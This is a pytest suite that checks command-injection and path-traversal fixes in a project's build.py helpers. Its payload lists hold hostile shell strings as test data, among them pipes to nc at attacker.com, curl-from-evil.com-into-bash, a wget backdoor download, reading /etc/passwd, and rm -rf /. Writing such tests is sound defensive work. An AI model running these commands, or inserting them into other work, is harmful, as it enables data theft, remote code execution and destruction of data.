#!/usr/bin/env python3
"""
Security tests for build.py command injection fixes.

This test suite verifies that command injection vulnerabilities
have been properly fixed in the build system.
"""

import pytest
import sys
import os
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from build import system2, safe_mkdir, safe_copy


class TestCommandInjectionPrevention:
    """Test that command injection attacks are prevented."""
    
    def test_system2_prevents_injection_semicolon(self):
        """Verify semicolon injection is prevented."""
        with pytest.raises(SystemExit):
            system2("echo test; rm -rf /tmp/test")
    
    def test_system2_prevents_injection_pipe(self):
        """Verify pipe injection is prevented."""
        with pytest.raises(SystemExit):
            system2("echo test | nc attacker.com 1234")
    
    def test_system2_prevents_injection_backticks(self):
        """Verify backtick command substitution is prevented."""
        with pytest.raises(SystemExit):
            system2("echo `whoami`")
    
    def test_system2_prevents_injection_dollar(self):
        """Verify dollar command substitution is prevented."""
        with pytest.raises(SystemExit):
            system2("echo $(id)")
    
    def test_system2_prevents_injection_ampersand(self):
        """Verify ampersand background execution is prevented."""
        with pytest.raises(SystemExit):
            system2("sleep 10 & echo test")
    
    def test_system2_with_valid_command(self, tmp_path):
        """Verify legitimate commands still work."""
        test_file = tmp_path / "test.txt"
        system2(f"echo test > {test_file}")
        # This should work if shell is properly disabled
    
    def test_system2_with_list_args(self, tmp_path):
        """Verify list argument passing works."""
        test_file = tmp_path / "test.txt"
        system2(["touch", str(test_file)])
        assert test_file.exists()


class TestSafeMkdir:
    """Test safe directory creation."""
    
    def test_safe_mkdir_creates_directory(self, tmp_path):
        """Verify directory creation works."""
        test_dir = tmp_path / "testdir"
        safe_mkdir(str(test_dir))
        assert test_dir.exists()
        assert test_dir.is_dir()
    
    def test_safe_mkdir_creates_parents(self, tmp_path):
        """Verify parent directory creation."""
        test_dir = tmp_path / "parent" / "child" / "grandchild"
        safe_mkdir(str(test_dir), parents=True)
        assert test_dir.exists()
    
    def test_safe_mkdir_prevents_traversal(self):
        """Verify directory traversal is handled."""
        # Path normalization should handle .. safely
        with pytest.raises(SystemExit):
            safe_mkdir("../../../../etc/evil")
    
    def test_safe_mkdir_idempotent(self, tmp_path):
        """Verify multiple calls don't fail."""
        test_dir = tmp_path / "testdir"
        safe_mkdir(str(test_dir))
        safe_mkdir(str(test_dir))  # Should not fail
        assert test_dir.exists()


class TestSafeCopy:
    """Test safe file copying."""
    
    def test_safe_copy_file(self, tmp_path):
        """Verify file copying works."""
        src = tmp_path / "source.txt"
        dst = tmp_path / "dest.txt"
        
        src.write_text("test content")
        safe_copy(str(src), str(dst))
        
        assert dst.exists()
        assert dst.read_text() == "test content"
    
    def test_safe_copy_directory_recursive(self, tmp_path):
        """Verify recursive directory copying."""
        src_dir = tmp_path / "srcdir"
        dst_dir = tmp_path / "dstdir"
        
        src_dir.mkdir()
        (src_dir / "file1.txt").write_text("content1")
        (src_dir / "file2.txt").write_text("content2")
        
        safe_copy(str(src_dir), str(dst_dir), recursive=True)
        
        assert dst_dir.exists()
        assert (dst_dir / "file1.txt").read_text() == "content1"
        assert (dst_dir / "file2.txt").read_text() == "content2"
    
    def test_safe_copy_nonexistent_source(self, tmp_path):
        """Verify error on nonexistent source."""
        src = tmp_path / "nonexistent.txt"
        dst = tmp_path / "dest.txt"
        
        with pytest.raises(SystemExit):
            safe_copy(str(src), str(dst))
    
    def test_safe_copy_creates_dest_directory(self, tmp_path):
        """Verify destination directory is created."""
        src = tmp_path / "source.txt"
        dst = tmp_path / "subdir" / "dest.txt"
        
        src.write_text("test")
        safe_copy(str(src), str(dst))
        
        assert dst.exists()
        assert dst.read_text() == "test"


class TestMaliciousInputs:
    """Test with actual malicious payloads."""
    
    MALICIOUS_PAYLOADS = [
        "; rm -rf /",
        "| nc attacker.com 1234",
        "$(curl http://evil.com/payload.sh | bash)",
        "`id`",
        "&& wget evil.com/backdoor -O /tmp/backdoor",
        "; cat /etc/passwd | nc attacker.com 1234",
        "|| echo 'pwned' > /tmp/pwned",
        "& sleep 3600 #",
    ]
    
    def test_malicious_payloads_blocked(self):
        """Verify all malicious payloads are blocked."""
        for payload in self.MALICIOUS_PAYLOADS:
            with pytest.raises(SystemExit):
                system2(f"echo {payload}")
    
    def test_path_traversal_payloads(self, tmp_path):
        """Test path traversal attempts."""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/../etc/passwd",
        ]
        
        for attempt in traversal_attempts:
            # These should either fail or be safely normalized
            test_path = tmp_path / attempt
            try:
                safe_mkdir(str(test_path))
                # If it succeeds, verify it's within tmp_path
                assert test_path.resolve().is_relative_to(tmp_path.resolve())
            except (SystemExit, ValueError):
                # Expected to fail
                pass


class TestSecurityRegression:
    """Regression tests to ensure vulnerabilities don't return."""
    
    def test_no_os_system_in_build_py(self):
        """Verify os.system() is not used except in comments."""
        build_py = Path(__file__).parent.parent / "build.py"
        content = build_py.read_text()
        
        # Find all os.system calls
        import re
        os_system_calls = re.findall(r'os\.system\([^)]+\)', content)
        
        # Filter out comments and docstrings
        for call in os_system_calls:
            # Should only appear in comments/docstrings
            assert '#' in call or 'SECURITY' in call or 'replaces' in call, \
                f"Found unsafe os.system() call: {call}"
    
    def test_subprocess_shell_false(self):
        """Verify subprocess.run uses shell=False."""
        build_py = Path(__file__).parent.parent / "build.py"
        content = build_py.read_text()
        
        import re
        subprocess_calls = re.findall(r'subprocess\.run\([^)]+\)', content, re.MULTILINE | re.DOTALL)
        
        for call in subprocess_calls:
            # Should have shell=False explicitly set
            assert 'shell=False' in call, \
                f"subprocess.run() should have shell=False: {call[:100]}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
